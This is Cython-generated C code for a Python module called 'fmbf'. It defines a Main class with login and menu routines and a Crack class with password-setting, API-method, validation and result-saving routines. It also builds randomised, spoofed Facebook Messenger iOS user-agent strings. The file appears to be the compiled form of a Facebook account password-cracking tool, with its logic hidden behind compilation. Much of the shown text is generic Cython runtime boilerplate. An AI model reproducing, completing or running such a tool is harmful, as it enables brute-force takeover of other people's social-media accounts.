    PyTuple_SET_ITEM(__pyx_t_5, 5, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_INCREF(__pyx_kp_u_FBAN_MessengerForiOS_FBAV_112_0);
    __pyx_t_6 += 39;
    __Pyx_GIVEREF(__pyx_kp_u_FBAN_MessengerForiOS_FBAV_112_0);
    PyTuple_SET_ITEM(__pyx_t_5, 6, __pyx_kp_u_FBAN_MessengerForiOS_FBAV_112_0);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__81, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_5, 7, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_INCREF(__pyx_kp_u_FBBV_54364624_FBDV_iPhone5_1_FB);
    __pyx_t_6 += 56;
    __Pyx_GIVEREF(__pyx_kp_u_FBBV_54364624_FBDV_iPhone5_1_FB);
    PyTuple_SET_ITEM(__pyx_t_5, 8, __pyx_kp_u_FBBV_54364624_FBDV_iPhone5_1_FB);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_versi); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_replace); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__82, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
    __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_5, 9, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_INCREF(__pyx_kp_u_FBSS_2_FBCR_T_Mobile_FBID_phone);
    __pyx_t_6 += 58;
    __Pyx_GIVEREF(__pyx_kp_u_FBSS_2_FBCR_T_Mobile_FBID_phone);
    PyTuple_SET_ITEM(__pyx_t_5, 10, __pyx_kp_u_FBSS_2_FBCR_T_Mobile_FBID_phone);
    __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 11, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_ua, __pyx_t_4) < 0) __PYX_ERR(0, 29, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ua); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 35, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ugent); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 35, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_9 = (__Pyx_PySequence_ContainsTF(__pyx_t_4, __pyx_t_5, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 35, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_10 = (__pyx_t_9 != 0);
    if (__pyx_t_10) {
      goto __pyx_L4;
    }

    
     {
      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_ugent); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 36, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_ua); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 36, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_11 = __Pyx_PyObject_Append(__pyx_t_5, __pyx_t_4); if (unlikely(__pyx_t_11 == ((int)-1))) __PYX_ERR(0, 36, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_L4:;
  }

  
  __pyx_t_4 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_Main, __pyx_n_s_Main, (PyObject *) NULL, __pyx_n_s_fmbf, (PyObject *) NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_4Main_1__init__, 0, __pyx_n_s_Main___init, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__84)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_init, __pyx_t_5) < 0) __PYX_ERR(0, 40, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_4Main_3logo, 0, __pyx_n_s_Main_logo, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__86)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_logo, __pyx_t_5) < 0) __PYX_ERR(0, 45, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_4Main_5login, 0, __pyx_n_s_Main_login, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__88)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_login, __pyx_t_5) < 0) __PYX_ERR(0, 55, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_4Main_7menu, 0, __pyx_n_s_Main_menu, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__90)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_menu, __pyx_t_5) < 0) __PYX_ERR(0, 82, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_4Main_9publik, 0, __pyx_n_s_Main_publik, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__92)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_publik, __pyx_t_5) < 0) __PYX_ERR(0, 124, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_4Main_11set_ugent, 0, __pyx_n_s_Main_set_ugent, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__94)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 139, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_set_ugent, __pyx_t_5) < 0) __PYX_ERR(0, 139, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_4Main_13cek_result, 0, __pyx_n_s_Main_cek_result, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__96)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 176, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_cek_result, __pyx_t_5) < 0) __PYX_ERR(0, 176, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_Main, __pyx_empty_tuple, __pyx_t_4, NULL, 0, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Main, __pyx_t_5) < 0) __PYX_ERR(0, 38, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __pyx_t_4 = __Pyx_Py3MetaclassPrepare((PyObject *) NULL, __pyx_empty_tuple, __pyx_n_s_Crack, __pyx_n_s_Crack, (PyObject *) NULL, __pyx_n_s_fmbf, (PyObject *) NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 201, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_5Crack_1__init__, 0, __pyx_n_s_Crack___init, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__98)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 203, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_init, __pyx_t_5) < 0) __PYX_ERR(0, 203, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_5Crack_3atursandi, 0, __pyx_n_s_Crack_atursandi, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__100)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_atursandi, __pyx_t_5) < 0) __PYX_ERR(0, 210, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_5Crack_5sandi, 0, __pyx_n_s_Crack_sandi, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__102)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_sandi, __pyx_t_5) < 0) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_5Crack_7metode_api, 0, __pyx_n_s_Crack_metode_api, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__104)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 272, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_metode_api, __pyx_t_5) < 0) __PYX_ERR(0, 272, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_5Crack_9metode_validate, 0, __pyx_n_s_Crack_metode_validate, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__106)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 303, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_metode_validate, __pyx_t_5) < 0) __PYX_ERR(0, 303, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_CyFunction_New(&__pyx_mdef_4fmbf_5Crack_11simpan_hasil, 0, __pyx_n_s_Crack_simpan_hasil, NULL, __pyx_n_s_fmbf, __pyx_d, ((PyObject *)__pyx_codeobj__108)); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 336, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (__Pyx_SetNameInClass(__pyx_t_4, __pyx_n_s_simpan_hasil, __pyx_t_5) < 0) __PYX_ERR(0, 336, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = __Pyx_Py3ClassCreate(((PyObject*)&__Pyx_DefaultClassType), __pyx_n_s_Crack, __pyx_empty_tuple, __pyx_t_4, NULL, 0, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 201, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_Crack, __pyx_t_5) < 0) __PYX_ERR(0, 201, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_name_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 341, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_10 = (__Pyx_PyString_Equals(__pyx_t_4, __pyx_n_s_main, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 341, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (__pyx_t_10) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Main); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 342, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 342, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_menu); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 342, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_CallNoArg(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 342, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
  }

  
  __pyx_t_5 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_5) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_8);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init fmbf", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init fmbf");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}



#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif


#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif


static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}


#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif


#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif


#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}


#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif


#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif


#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif


static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
